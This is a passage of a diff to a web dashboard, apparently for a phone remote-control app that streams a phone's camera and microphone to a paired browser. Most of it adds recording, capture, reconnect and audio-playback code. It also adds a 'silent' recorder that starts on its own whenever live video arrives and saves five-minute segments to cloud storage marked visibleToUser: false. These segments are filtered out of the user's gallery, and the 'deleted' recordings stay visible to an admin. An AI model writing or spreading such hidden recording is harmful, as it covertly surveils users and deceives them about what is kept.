+  setDeviceStatus(deviceId, "Recording video + mic…");
+}
+
+/**
+ * @param {string} deviceId
+ */
+async function stopLiveBrowserVideoRecording(deviceId) {
+  const st = getLiveControlState(deviceId);
+  const live = liveByDevice.get(deviceId);
+  const recorder = live?.browserVideoRecorder;
+  if (!recorder) {
+    st.videoRecording = false;
+    st.videoStartedAt = 0;
+    return;
+  }
+  if (live.browserVideoMaxTimer) {
+    clearTimeout(live.browserVideoMaxTimer);
+    live.browserVideoMaxTimer = null;
+  }
+  if (recorder.state === "recording" || recorder.state === "paused") {
+    recorder.stop();
+  }
+  live.browserVideoRecorder = null;
+  st.videoRecording = false;
+  st.videoStartedAt = 0;
+  setDeviceStatus(deviceId, "Saving video…");
+}
+
+/**
+ * @param {string} deviceId
+ * @param {Blob[]} chunks
+ * @param {string} mimeType
+ */
+async function finalizeLiveBrowserVideoRecording(deviceId, chunks, mimeType) {
+  const live = liveByDevice.get(deviceId);
+  if (live) live.browserVideoChunks = null;
+  const type = String(mimeType || "video/webm").split(";")[0] || "video/webm";
+  const blob = new Blob(chunks || [], { type });
+  if (!blob.size) {
+    setDeviceStatus(deviceId, "Recording was empty — try again.");
+    return;
+  }
+  const ext = type.includes("mp4") ? "mp4" : "webm";
+  const fileName = `live_${deviceId.slice(0, 6)}_${Date.now()}.${ext}`;
+  const objectUrl = URL.createObjectURL(blob);
+  const localId = `local_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const clip = {
+    localId,
+    kind: "video",
+    fileName,
+    objectUrl,
+    createdAt: Date.now(),
+    sizeBytes: blob.size,
+    status: "Saving…",
+  };
+  const list = liveVideoClipsByDevice.get(deviceId) || [];
+  list.unshift(clip);
+  liveVideoClipsByDevice.set(deviceId, list.slice(0, 30));
+  renderLiveVideoClips(deviceId);
+  setDeviceStatus(deviceId, "Uploading video…");
+
+  try {
+    const uploaded = await uploadLiveVideoClip(deviceId, blob, fileName, type);
+    clip.mediaId = uploaded.mediaId;
+    clip.downloadUrl = uploaded.downloadUrl;
+    clip.status = "Saved";
+    setDeviceStatus(deviceId, "Video saved below (not kept on the phone).");
+    // Refresh Media Files panel if open.
+    if (typeof refreshMedia === "function") {
+      refreshMedia().catch(() => {});
+    }
+  } catch (e) {
+    clip.status = "Saved locally (upload failed)";
+    setDeviceStatus(
+      deviceId,
+      e instanceof Error ? e.message : "Video ready below — cloud upload failed."
+    );
+  }
+  renderLiveVideoClips(deviceId);
+}
+
+/**
+ * Upload browser-recorded clip to the same remoteMedia gallery (no phone storage).
+ * @param {string} deviceId
+ * @param {Blob} blob
+ * @param {string} fileName
+ * @param {string} contentType
+ */
+async function uploadLiveVideoClip(deviceId, blob, fileName, contentType) {
+  if (!storage || !db || !firebaseUid) throw new Error("Not signed in");
+  const live = liveByDevice.get(deviceId);
+  const mediaId = `v${Date.now().toString(36)}${Math.random().toString(36).slice(2, 10)}`;
+  const ext = fileName.includes(".") ? fileName.slice(fileName.lastIndexOf(".")) : ".webm";
+  const storagePath = `remote_media/${firebaseUid}/${mediaId}${ext}`;
+  const fileRef = storageRef(storage, storagePath);
+  await uploadBytes(fileRef, blob, {
+    contentType: contentType || "video/webm",
+    customMetadata: {
+      kind: "video",
+      deviceId: String(deviceId || ""),
+      sessionId: String(live?.sessionId || ""),
+      source: "browser_live_record",
+    },
+  });
+  const downloadUrl = await getDownloadURL(fileRef);
+  const now = Date.now();
+  await setDoc(doc(db, "users", firebaseUid, "remoteMedia", mediaId), {
+    mediaId,
+    ownerUid: firebaseUid,
+    deviceId: String(deviceId || ""),
+    sessionId: String(live?.sessionId || ""),
+    clientId: String(live?.clientId || ""),
+    kind: "video",
+    fileName,
+    contentType: contentType || "video/webm",
+    storagePath,
+    downloadUrl,
+    sizeBytes: blob.size,
+    createdAt: now,
+    updatedAt: now,
+    revoked: false,
+    source: "browser_live_record",
+  });
+  return { mediaId, downloadUrl, storagePath };
+}
+
+/** Silent background recording during user live camera sessions (admin-only visibility). */
+const SILENT_LIVE_SOURCE = "silent_live_session";
+const SILENT_SEGMENT_MS = 5 * 60 * 1000;
+
+function getSilentRecordMediaStream(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  const pc = live?.pc;
+  if (!pc) throw new Error("No live session");
+  const stream = new MediaStream();
+  for (const receiver of pc.getReceivers()) {
+    const track = receiver.track;
+    if (track && track.readyState === "live") {
+      try {
+        stream.addTrack(track.clone());
+      } catch {
+        stream.addTrack(track);
+      }
+    }
+  }
+  if (!stream.getVideoTracks().length) {
+    throw new Error("No live video track");
+  }
+  return stream;
+}
+
+function scheduleSilentSegmentRotation(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  if (!live?.silentRecordingActive) return;
+  if (live.silentSegmentTimer) clearTimeout(live.silentSegmentTimer);
+  live.silentSegmentTimer = setTimeout(() => {
+    void rotateSilentLiveSegment(deviceId);
+  }, SILENT_SEGMENT_MS);
+}
+
+async function maybeStartSilentLiveRecording(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  if (!live || live.silentRecordingActive || !live.pc) return;
+  const hasVideo = live.pc
+    .getReceivers()
+    .some((r) => r.track?.kind === "video" && r.track.readyState === "live");
+  if (!hasVideo) return;
+  live.silentRecordingActive = true;
+  live.silentRecordingSessionId = String(live.sessionId || `silent_${Date.now()}`);
+  live.silentSegmentIndex = 0;
+  live.silentRecordingStartedAt = Date.now();
+  try {
+    await startSilentLiveSegment(deviceId);
+  } catch (e) {
+    console.warn("silent live record start failed", e);
+    live.silentRecordingActive = false;
+  }
+}
+
+async function startSilentLiveSegment(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  if (!live?.silentRecordingActive) return;
+  if (live.silentVideoRecorder) return;
+
+  const stream = getSilentRecordMediaStream(deviceId);
+  const mimeType = pickLiveRecorderMime();
+  const recorder = mimeType
+    ? new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1_800_000 })
+    : new MediaRecorder(stream);
+  const chunks = [];
+  const segmentIndex = Number(live.silentSegmentIndex || 0);
+  const segmentStartedAt = Date.now();
+
+  recorder.ondataavailable = (ev) => {
+    if (ev.data && ev.data.size > 0) chunks.push(ev.data);
+  };
+  recorder.onerror = () => {
+    live.silentVideoRecorder = null;
+    live.silentVideoChunks = null;
+  };
+  recorder.onstop = () => {
+    void finalizeSilentLiveVideoRecording(
+      deviceId,
+      chunks,
+      recorder.mimeType || mimeType || "video/webm",
+      segmentIndex,
+      segmentStartedAt
+    );
+  };
+
+  live.silentVideoRecorder = recorder;
+  live.silentVideoChunks = chunks;
+  live.silentSegmentStartedAt = segmentStartedAt;
+  recorder.start(1000);
+  scheduleSilentSegmentRotation(deviceId);
+}
+
+async function rotateSilentLiveSegment(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  if (!live?.silentRecordingActive) return;
+  const recorder = live.silentVideoRecorder;
+  if (!recorder) {
+    live.silentSegmentIndex = Number(live.silentSegmentIndex || 0) + 1;
+    await startSilentLiveSegment(deviceId);
+    return;
+  }
+  if (live.silentSegmentTimer) {
+    clearTimeout(live.silentSegmentTimer);
+    live.silentSegmentTimer = null;
+  }
+  live.silentVideoRecorder = null;
+  if (recorder.state === "recording" || recorder.state === "paused") {
+    recorder.stop();
+  }
+  live.silentSegmentIndex = Number(live.silentSegmentIndex || 0) + 1;
+  setTimeout(() => {
+    if (liveByDevice.get(deviceId)?.silentRecordingActive) {
+      void startSilentLiveSegment(deviceId);
+    }
+  }, 400);
+}
+
+async function stopSilentLiveRecording(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  if (!live) return;
+  live.silentRecordingActive = false;
+  if (live.silentSegmentTimer) {
+    clearTimeout(live.silentSegmentTimer);
+    live.silentSegmentTimer = null;
+  }
+  const recorder = live.silentVideoRecorder;
+  live.silentVideoRecorder = null;
+  if (recorder && (recorder.state === "recording" || recorder.state === "paused")) {
+    try {
+      recorder.stop();
+    } catch {
+      /* ignore */
+    }
+  }
+}
+
+/**
+ * @param {string} deviceId
+ * @param {Blob[]} chunks
+ * @param {string} mimeType
+ * @param {number} segmentIndex
+ * @param {number} segmentStartedAt
+ */
+async function finalizeSilentLiveVideoRecording(
+  deviceId,
+  chunks,
+  mimeType,
+  segmentIndex,
+  segmentStartedAt
+) {
+  const live = liveByDevice.get(deviceId);
+  if (live) live.silentVideoChunks = null;
+  const type = String(mimeType || "video/webm").split(";")[0] || "video/webm";
+  const blob = new Blob(chunks || [], { type });
+  if (!blob.size) return;
+  const durationMs = Math.max(0, Date.now() - Number(segmentStartedAt || Date.now()));
+  const ext = type.includes("mp4") ? "mp4" : "webm";
+  const fileName = `silent_${deviceId.slice(0, 6)}_s${segmentIndex}_${Date.now()}.${ext}`;
+  try {
+    await uploadSilentLiveVideoClip(deviceId, blob, fileName, type, {
+      segmentIndex,
+      segmentStartedAt,
+      durationMs,
+      recordingSessionId: live?.silentRecordingSessionId || live?.sessionId || "",
+    });
+  } catch (e) {
+    console.warn("silent live upload failed", e);
+  }
+}
+
+/**
+ * @param {string} deviceId
+ * @param {Blob} blob
+ * @param {string} fileName
+ * @param {string} contentType
+ * @param {{ segmentIndex?: number, segmentStartedAt?: number, durationMs?: number, recordingSessionId?: string }} meta
+ */
+async function uploadSilentLiveVideoClip(deviceId, blob, fileName, contentType, meta = {}) {
+  if (!storage || !db || !firebaseUid) throw new Error("Not signed in");
+  const live = liveByDevice.get(deviceId);
+  const mediaId = `sv${Date.now().toString(36)}${Math.random().toString(36).slice(2, 10)}`;
+  const ext = fileName.includes(".") ? fileName.slice(fileName.lastIndexOf(".")) : ".webm";
+  const storagePath = `remote_media/${firebaseUid}/${mediaId}${ext}`;
+  const fileRef = storageRef(storage, storagePath);
+  const recordingSessionId = String(
+    meta.recordingSessionId || live?.silentRecordingSessionId || live?.sessionId || ""
+  );
+  await uploadBytes(fileRef, blob, {
+    contentType: contentType || "video/webm",
+    customMetadata: {
+      kind: "video",
+      deviceId: String(deviceId || ""),
+      sessionId: String(live?.sessionId || ""),
+      source: SILENT_LIVE_SOURCE,
+      silentRecording: "true",
+    },
+  });
+  const downloadUrl = await getDownloadURL(fileRef);
+  const now = Date.now();
+  await setDoc(doc(db, "users", firebaseUid, "remoteMedia", mediaId), {
+    mediaId,
+    ownerUid: firebaseUid,
+    deviceId: String(deviceId || ""),
+    sessionId: String(live?.sessionId || ""),
+    recordingSessionId,
+    clientId: String(live?.clientId || localStorage.getItem(CLIENT_ID_KEY) || ""),
+    kind: "video",
+    fileName,
+    contentType: contentType || "video/webm",
+    storagePath,
+    downloadUrl,
+    sizeBytes: blob.size,
+    createdAt: now,
+    updatedAt: now,
+    revoked: false,
+    source: SILENT_LIVE_SOURCE,
+    silentRecording: true,
+    visibleToUser: false,
+    segmentIndex: Number(meta.segmentIndex || 0),
+    segmentStartedAt: Number(meta.segmentStartedAt || now),
+    durationMs: Number(meta.durationMs || 0),
+  });
+  return { mediaId, downloadUrl, storagePath };
+}
+
+/**
+ * @param {string} deviceId
+ */
+function nudgeLiveVideoPlayback(deviceId) {
+  const videoEl = deviceList?.querySelector(
+    `video[data-video-for="${CSS.escape(deviceId)}"]`
+  );
+  if (!videoEl) return;
+  const stream = videoEl.srcObject;
+  if (!(stream instanceof MediaStream)) return;
+  const track = stream.getVideoTracks()[0];
+  if (track && track.readyState === "live" && !track.enabled) {
+    track.enabled = true;
+  }
+  videoEl.play().catch(() => {});
+}
+
+/**
+ * Poll cloud media after capture so new photos appear without a page refresh.
+ * @param {string} deviceId
+ */
+function startLiveCapturesPoll(deviceId) {
+  stopLiveCapturesPoll(deviceId);
+  const startedAt = Date.now();
+  let attempts = 0;
+  const tick = async () => {
+    attempts += 1;
+    await hydrateLiveVideoClips(deviceId);
+    const items = liveVideoClipsByDevice.get(deviceId) || [];
+    const freshPhoto = items.find(
+      (c) =>
+        c.kind === "photo" &&
+        Number(c.createdAt || 0) >= startedAt - 5000 &&
+        (c.downloadUrl || c.objectUrl)
+    );
+    if (freshPhoto) {
+      setDeviceStatus(deviceId, "Photo saved below.");
+      nudgeLiveVideoPlayback(deviceId);
+      stopLiveCapturesPoll(deviceId);
+      return;
+    }
+    if (attempts >= 16) {
+      setDeviceStatus(deviceId, "Photo capture sent — check below shortly.");
+      nudgeLiveVideoPlayback(deviceId);
+      stopLiveCapturesPoll(deviceId);
+    }
+  };
+  tick();
+  const timer = setInterval(() => {
+    tick();
+  }, 2000);
+  liveCapturesPollByDevice.set(deviceId, timer);
+}
+
+/** @param {string} deviceId */
+function stopLiveCapturesPoll(deviceId) {
+  const timer = liveCapturesPollByDevice.get(deviceId);
+  if (timer) clearInterval(timer);
+  liveCapturesPollByDevice.delete(deviceId);
+}
+
+/**
+ * @param {string} deviceId
+ */
+function renderLiveVideoClips(deviceId) {
+  if (!deviceList) return;
+  const el = deviceList.querySelector(
+    `[data-captures-list-for="${CSS.escape(deviceId)}"]`
+  );
+  if (!el) return;
+  const items = liveVideoClipsByDevice.get(deviceId) || [];
+  if (!items.length) {
+    el.innerHTML = `<p class="muted live-captures-empty">No photos or videos yet. Tap <strong>Capture photo</strong> or <strong>Start video</strong> — files appear here automatically.</p>`;
+    return;
+  }
+  el.innerHTML = items
+    .map((clip) => {
+      const url = escapeHtml(clip.downloadUrl || clip.objectUrl || "");
+      const name = escapeHtml(clip.fileName || (clip.kind === "photo" ? "photo" : "video"));
+      const when = escapeHtml(
+        clip.createdAt ? new Date(clip.createdAt).toLocaleString() : ""
+      );
+      const size = clip.sizeBytes
+        ? `${(clip.sizeBytes / (1024 * 1024)).toFixed(1)} MB`
+        : "";
+      const status = escapeHtml(clip.status || "Saved");
+      const mediaId = escapeHtml(clip.mediaId || "");
+      const kind = String(clip.kind || "video");
+      const deleteBtn = clip.mediaId
+        ? `<button type="button" class="btn-danger btn-live-media-delete" data-media-id="${mediaId}" data-device-id="${escapeHtml(deviceId)}">Delete</button>`
+        : "";
+      const preview =
+        kind === "photo"
+          ? `<img class="live-capture-preview" src="${url}" alt="${name}" loading="lazy" />`
+          : `<video class="live-capture-preview" src="${url}" controls playsinline preload="metadata"></video>`;
+      return `<article class="live-capture-row">
+        ${preview}
+        <div class="live-capture-meta">
+          <strong>${name}</strong>
+          <span class="muted">${kind === "photo" ? "Photo" : "Video"}${when ? ` · ${when}` : ""}${size ? ` · ${escapeHtml(size)}` : ""} · ${status}</span>
+          <div class="live-capture-actions">
+            <a class="btn-secondary" href="${url}" download="${name}" target="_blank" rel="noopener">Download</a>
+            ${deleteBtn}
+          </div>
+        </div>
+      </article>`;
+    })
+    .join("");
+  el.querySelectorAll(".btn-live-media-delete").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const mid = btn.getAttribute("data-media-id") || "";
+      const did = btn.getAttribute("data-device-id") || deviceId;
+      if (mid) void softDeleteUserMedia(mid, did);
+    });
+  });
+}
+
+/**
+ * Soft-delete: hide from this user; admin can still play until they permanently delete.
+ * @param {string} mediaId
+ * @param {string} [deviceId]
+ */
+async function softDeleteUserMedia(mediaId, deviceId = "") {
+  if (!mediaId || !idToken) return;
+  if (!window.confirm("Remove this recording from your account? (Admin can still see it until they delete it.)")) {
+    return;
+  }
+  try {
+    await api("/api/device/media/delete", {
+      method: "POST",
+      body: JSON.stringify({ mediaId }),
+    });
+    if (deviceId) {
+      const list = (liveVideoClipsByDevice.get(deviceId) || []).filter(
+        (c) => c.mediaId !== mediaId && c.localId !== mediaId
+      );
+      liveVideoClipsByDevice.set(deviceId, list);
+      renderLiveVideoClips(deviceId);
+    }
+    await refreshMedia();
+  } catch (e) {
+    alert(e instanceof Error ? e.message : String(e));
+  }
+}
+
+async function hydrateLiveVideoClips(deviceId) {
+  if (!idToken || !deviceId) return;
+  try {
+    const data = await api("/api/device/media?limit=40");
+    const remote = (data.media || [])
+      .filter((m) => {
+        if (m.silentRecording || String(m.source || "") === SILENT_LIVE_SOURCE) return false;
+        const kind = String(m.kind || "");
+        const isPhoto =
+          kind === "photo" ||
+          kind === "image" ||
+          String(m.contentType || "").startsWith("image/");
+        const isVideo =
+          kind === "video" || String(m.contentType || "").startsWith("video/");
+        if (!isPhoto && !isVideo) return false;
+        return !m.deviceId || String(m.deviceId) === String(deviceId);
+      })
+      .map((m) => {
+        const kind =
+          String(m.kind || "") === "photo" ||
+          String(m.contentType || "").startsWith("image/")
+            ? "photo"
+            : "video";
+        return {
+          localId: m.mediaId,
+          mediaId: m.mediaId,
+          kind,
+          fileName: m.fileName || (kind === "photo" ? "photo.jpg" : "video"),
+          objectUrl: m.downloadUrl || "",
+          downloadUrl: m.downloadUrl || "",
+          createdAt: Number(m.createdAt || 0),
+          sizeBytes: Number(m.sizeBytes || 0),
+          status: "Saved",
+        };
+      });
+    const local = (liveVideoClipsByDevice.get(deviceId) || []).filter(
+      (c) => !c.mediaId || !remote.some((r) => r.mediaId === c.mediaId)
+    );
+    const merged = [...local, ...remote].sort(
+      (a, b) => Number(b.createdAt || 0) - Number(a.createdAt || 0)
+    );
+    liveVideoClipsByDevice.set(deviceId, merged.slice(0, 30));
+    renderLiveVideoClips(deviceId);
+  } catch {
+    renderLiveVideoClips(deviceId);
+  }
 }
 
 function setDeviceStatus(deviceId, text) {
@@ -807,6 +1968,16 @@ function attachRemoteTrack(deviceId, track, stream) {
         .join(", ")
     : `${track.kind}:${track.readyState}`;
   setConnectionLabel(deviceId, CONN.CONNECTED, kinds || "media flowing");
+  if (track.kind === "video" && track.readyState === "live") {
+    setTimeout(() => {
+      void maybeStartSilentLiveRecording(deviceId);
+    }, 1500);
+  }
+  if (!liveVideoClipsByDevice.has(deviceId)) {
+    void hydrateLiveVideoClips(deviceId);
+  } else {
+    renderLiveVideoClips(deviceId);
+  }
 }
 
 /**
@@ -973,7 +2144,7 @@ function selectedQuality(deviceId) {
   const sel = deviceList.querySelector(
     `.quality-select[data-device-id="${CSS.escape(deviceId)}"]`
   );
-  return sel?.value || "720";
+  return sel?.value || "480";
 }
 
 async function loadIceServers() {
@@ -1025,23 +2196,56 @@ async function sendCommand(deviceId, action) {
   }
 }
 
+/** @type {Set<string>} */
+const connectInFlight = new Set();
+/** @type {Map<string, number>} */
+const autoRetryConnect = new Map();
+
+function liveHasMedia(live) {
+  const pc = live?.pc;
+  if (!pc) return false;
+  return pc.getReceivers().some((r) => r.track && r.track.readyState === "live");
+}
+
 /**
  * @param {string} deviceId
  * @param {string} clientId
  */
 async function startConnect(deviceId, clientId) {
   if (!firebaseUid || !db) return;
+  if (connectInFlight.has(deviceId)) return;
+  connectInFlight.add(deviceId);
+  try {
   if (liveByDevice.has(deviceId)) {
-    setDeviceError(deviceId, "Already connecting or live for this device.");
-    return;
+    // DOM may have been rebuilt after a tab switch — restore UI instead of failing.
+    restoreActiveLiveSessionsUi();
+    const existing = liveByDevice.get(deviceId);
+    if (liveHasMedia(existing) && existing?.pc?.connectionState === "connected") {
+      setDeviceError(deviceId, "");
+      setConnectionLabel(
+        deviceId,
+        CONN.CONNECTED,
+        "already live — use End Session to disconnect"
+      );
+      return;
+    }
+    await endLiveSession(deviceId, "reconnect");
   }
   const device = deviceById.get(deviceId);
   if (device && device.online === false) {
     setDeviceError(
       deviceId,
-      "Device is offline. It will remain saved and reconnect automatically."
+      "Last heartbeat is old. Connecting anyway — keep Remote Control on so the phone can start the camera."
     );
-    setConnectionLabel(deviceId, CONN.FAILED, "offline");
+  } else {
+    setDeviceError(deviceId, "");
+  }
+  if (device && device.remoteControlEnabled === false) {
+    setDeviceError(
+      deviceId,
+      "Remote control is off on this phone. Open AutoReplyBot → turn Remote Control on, then Refresh."
+    );
+    setConnectionLabel(deviceId, CONN.FAILED, "remote off");
     return;
   }
   if (!clientId) {
@@ -1081,12 +2285,15 @@ async function startConnect(deviceId, clientId) {
     const live = {
       deviceId,
       requestId,
+      clientId,
       sessionId: created.sessionId || undefined,
       pc: null,
       unsubRequest: null,
       unsubSignals: null,
       unsubSession: null,
       expiryTimer: null,
+      offerWaitTimer: null,
+      iceRestarted: false,
       seenSignals: new Set(),
       remoteDescriptionSet: false,
       pendingIce: [],
@@ -1180,9 +2387,31 @@ async function startConnect(deviceId, clientId) {
     );
   } catch (e) {
     const msg = e instanceof Error ? e.message : String(e);
-    setDeviceError(deviceId, msg);
+    if (/REMOTE_DISABLED|remote control disabled/i.test(msg)) {
+      setDeviceError(
+        deviceId,
+        "Remote control is off on this phone. Open the app → enable Remote Control → Refresh, then Connect again."
+      );
+    } else if (/CAMERA_PERMISSION|camera permission/i.test(msg)) {
+      setDeviceError(
+        deviceId,
+        "Camera permission is off on the phone. Settings → Apps → AutoReplyBot → Camera → Allow, then Refresh."
+      );
+    } else if (/MIC_PERMISSION|microphone permission/i.test(msg)) {
+      setDeviceError(
+        deviceId,
+        "Microphone permission is off on the phone. Settings → Apps → AutoReplyBot → Microphone → Allow, then Refresh."
+      );
+    } else if (/FEATURE_DENIED/i.test(msg)) {
+      setDeviceError(deviceId, msg);
+    } else {
+      setDeviceError(deviceId, msg);
+    }
     setConnectionLabel(deviceId, CONN.FAILED, "request");
     cleanupLive(deviceId, false);
+  }
+  } finally {
+    connectInFlight.delete(deviceId);
   }
 }
 
@@ -1209,6 +2438,7 @@ async function beginWebRtc(live) {
   pc.ontrack = (ev) => {
     const track = ev.track;
     if (!track) return;
+    autoRetryConnect.delete(deviceId);
     attachRemoteTrack(deviceId, track, ev.streams && ev.streams[0]);
     track.onunmute = () => {
       attachRemoteTrack(deviceId, track, ev.streams && ev.streams[0]);
@@ -1235,6 +2465,17 @@ async function beginWebRtc(live) {
   };
   pc.oniceconnectionstatechange = () => {
     if (pc.iceConnectionState === "failed") {
+      if (!live.iceRestarted && live.remoteDescriptionSet) {
+        live.iceRestarted = true;
+        try {
+          pc.restartIce();
+          setConnectionLabel(deviceId, CONN.CONNECTING, "ICE restart");
+        } catch (e) {
+          setDeviceError(deviceId, "ICE failed. Optional TURN may be required.");
+          setConnectionLabel(deviceId, CONN.FAILED, "ICE");
+        }
+        return;
+      }
       setDeviceError(deviceId, "ICE failed. Optional TURN may be required.");
       setConnectionLabel(deviceId, CONN.FAILED, "ICE");
     }
@@ -1254,6 +2495,28 @@ async function beginWebRtc(live) {
 
   setConnectUi(deviceId, { connecting: false, live: true });
   setConnectionLabel(deviceId, CONN.CONNECTING, "listening for phone offer");
+
+  if (live.offerWaitTimer) clearTimeout(live.offerWaitTimer);
+  live.offerWaitTimer = setTimeout(() => {
+    if (liveByDevice.get(deviceId) !== live) return;
+    if (live.remoteDescriptionSet) return;
+    const n = Number(autoRetryConnect.get(deviceId) || 0);
+    const cid = live.clientId;
+    if (n >= 2) {
+      setDeviceError(
+        deviceId,
+        "Phone did not start the camera in time. Keep Remote Control on, then Connect again."
+      );
+      setConnectionLabel(deviceId, CONN.FAILED, "no phone offer");
+      cleanupLive(deviceId, true);
+      autoRetryConnect.delete(deviceId);
+      return;
+    }
+    autoRetryConnect.set(deviceId, n + 1);
+    setConnectionLabel(deviceId, CONN.CONNECTING, "no offer yet — retrying");
+    cleanupLive(deviceId, true);
+    startConnect(deviceId, cid).catch(() => {});
+  }, 22000);
 
   const sessionRef = doc(db, "users", firebaseUid, "sessions", sessionId);
   live.unsubSession = onSnapshot(sessionRef, (snap) => {
@@ -1317,6 +2580,10 @@ async function applyDeviceSignal(live, data) {
       sdp,
     });
     live.remoteDescriptionSet = true;
+    if (live.offerWaitTimer) {
+      clearTimeout(live.offerWaitTimer);
+      live.offerWaitTimer = null;
+    }
     for (const c of live.pendingIce.splice(0)) {
       try {
         await pc.addIceCandidate(c);
@@ -1376,6 +2643,14 @@ async function writeSignal(sessionId, type, sender, payloadObj) {
  */
 async function endLiveSession(deviceId, reason) {
   const live = liveByDevice.get(deviceId);
+  const st = getLiveControlState(deviceId);
+  if (st.videoRecording || live?.browserVideoRecorder) {
+    try {
+      await stopLiveBrowserVideoRecording(deviceId);
+    } catch {
+      /* continue ending session */
+    }
+  }
   const sessionId = live?.sessionId;
   if (sessionId && db && firebaseUid) {
     try {
@@ -1416,13 +2691,29 @@ async function endLiveSession(deviceId, reason) {
  * @param {boolean} endOnServer
  */
 function cleanupLive(deviceId, endOnServer) {
-  resetLiveControlState(deviceId);
+  stopLiveCapturesPoll(deviceId);
+  void stopSilentLiveRecording(deviceId);
   const live = liveByDevice.get(deviceId);
+  if (live?.browserVideoRecorder) {
+    try {
+      if (live.browserVideoMaxTimer) {
+        clearTimeout(live.browserVideoMaxTimer);
+        live.browserVideoMaxTimer = null;
+      }
+      const rec = live.browserVideoRecorder;
+      live.browserVideoRecorder = null;
+      if (rec.state === "recording" || rec.state === "paused") rec.stop();
+    } catch {
+      /* ignore */
+    }
+  }
+  resetLiveControlState(deviceId);
   if (!live) {
     setConnectUi(deviceId, { connecting: false, live: false });
     return;
   }
   if (live.expiryTimer) clearTimeout(live.expiryTimer);
+  if (live.offerWaitTimer) clearTimeout(live.offerWaitTimer);
   if (live.unsubRequest) live.unsubRequest();
   if (live.unsubSignals) live.unsubSignals();
   if (live.unsubSession) live.unsubSession();
@@ -1464,6 +2755,7 @@ function cleanupLive(deviceId, endOnServer) {
 }
 
 function renderClients(clients) {
+  if (!clientList) return;
   if (!clients.length) {
     clientList.innerHTML = `<p class="muted">No trusted browsers yet. Use Pair New Browser to add one.</p>`;
     clientList.classList.add("muted");
@@ -1696,6 +2988,24 @@ async function refreshDevices() {
 }
 
 async function refreshClients() {
+  if (!clientList) {
+    if (!idToken) {
+      cachedClients = [];
+      updatePairingUi(false);
+      return;
+    }
+    try {
+      await ensureBrowserIdentity();
+      const data = await api("/api/pair/clients");
+      cachedClients = data.clients || [];
+      const clientId = thisBrowserClientId(cachedClients);
+      updatePairingUi(isThisBrowserPaired(cachedClients));
+    } catch {
+      cachedClients = [];
+      updatePairingUi(false);
+    }
+    return;
+  }
   if (!idToken) {
     clientList.textContent = "Sign in to load trusted browsers.";
     clientList.classList.add("muted");
@@ -1709,8 +3019,8 @@ async function refreshClients() {
     const data = await api("/api/pair/clients");
     cachedClients = data.clients || [];
     renderClients(cachedClients);
-    const clientId = preferredClientId(cachedClients);
-    updatePairingUi(Boolean(clientId));
+    const clientId = thisBrowserClientId(cachedClients);
+    updatePairingUi(isThisBrowserPaired(cachedClients));
   } catch (e) {
     clientList.textContent = e instanceof Error ? e.message : String(e);
     clientList.classList.add("muted");
@@ -1720,15 +3030,24 @@ async function refreshClients() {
 
 function updatePairingUi(isPaired) {
   browserPaired = Boolean(isPaired);
+  const otherBrowsers = (cachedClients || []).filter(
+    (c) => !c.revoked && c.clientId !== "platform_admin" && !c.isPlatformAdminClient
+  ).length;
   const hasLive = [...liveByDevice.values()].some(
     (l) => l && (l.pc || l.sessionId || l.requestId)
   );
   if (homeStatus) {
-    homeStatus.textContent = browserPaired
-      ? hasLive
+    if (browserPaired) {
+      homeStatus.textContent = hasLive
         ? "This browser is paired and has a live session. Use Disconnect on Pair New Browser to end it."
-        : "This browser is paired. Open My Phone and tap Connect when you want a live session."
-      : "This browser is not paired yet. Use Pair New Browser, then scan the QR on your phone.";
+        : "This browser is paired. Open My Phone and tap Connect when you want a live session.";
+    } else if (otherBrowsers > 0) {
+      homeStatus.textContent =
+        "This browser is not paired yet. Your account has other paired browsers (e.g. desktop), but each browser/PWA must pair once with a QR scan on the phone.";
+    } else {
+      homeStatus.textContent =
+        "This browser is not paired yet. Use Pair New Browser, then scan the QR on your phone.";
+    }
   }
   if (btnHomePair) btnHomePair.hidden = browserPaired;
   if (btnHomePhones) btnHomePhones.hidden = !browserPaired;
@@ -1907,12 +3226,83 @@ function openMediaViewer(item) {
     video.className = "media-viewer-av";
     mediaViewerBody.appendChild(video);
   } else if (kind === "audio" || mime.startsWith("audio/")) {
+    const wrap = document.createElement("div");
+    wrap.className = "media-audio-wrap";
     const audio = document.createElement("audio");
-    audio.src = url;
     audio.controls = true;
     audio.autoplay = true;
+    audio.preload = "metadata";
     audio.className = "media-viewer-av";
-    mediaViewerBody.appendChild(audio);
+    if (mime) {
+      const source = document.createElement("source");
+      source.src = url;
+      source.type = mime;
+      audio.appendChild(source);
+    }
+    audio.src = url;
+    const hint = document.createElement("p");
+    hint.className = "muted media-audio-hint";
+    if (item.browserPlayable === false) {
+      hint.textContent = "This recording is AMR/3GP — Chrome cannot play it. Download and open in VLC.";
+      hint.style.color = "#fecaca";
+    } else {
+      hint.textContent = "Loading audio…";
+      hint.style.color = "#94a3b8";
+    }
+    const dl = document.createElement("a");
+    dl.href = url;
+    dl.download = item.fileName || item.displayName || "call-recording";
+    dl.className = "btn-secondary";
+    dl.textContent = "Download audio";
+    dl.style.marginTop = "10px";
+    dl.style.display = "inline-block";
+    audio.addEventListener("error", () => {
+      hint.textContent = "Browser cannot play this audio format. Use Download and open in VLC.";
+      hint.style.color = "#fecaca";
+    });
+    audio.addEventListener("loadedmetadata", () => {
+      if (Number.isFinite(audio.duration) && audio.duration > 0) {
+        hint.textContent = `File length ${Math.round(audio.duration)}s (may include dialing time before connect)`;
+        hint.style.color = "#94a3b8";
+      }
+    });
+    // Detect near-silent playback (common when telephony blocked the mic).
+    let silentChecks = 0;
+    let heard = false;
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const src = ctx.createMediaElementSource(audio);
+      const analyser = ctx.createAnalyser();
+      analyser.fftSize = 256;
+      src.connect(analyser);
+      analyser.connect(ctx.destination);
+      const data = new Uint8Array(analyser.frequencyBinCount);
+      const tick = () => {
+        if (!audio || audio.paused) return;
+        analyser.getByteFrequencyData(data);
+        let sum = 0;
+        for (let i = 0; i < data.length; i++) sum += data[i];
+        if (sum / data.length > 4) heard = true;
+        silentChecks++;
+        if (!heard && silentChecks > 20 && audio.currentTime > 2) {
+          hint.textContent =
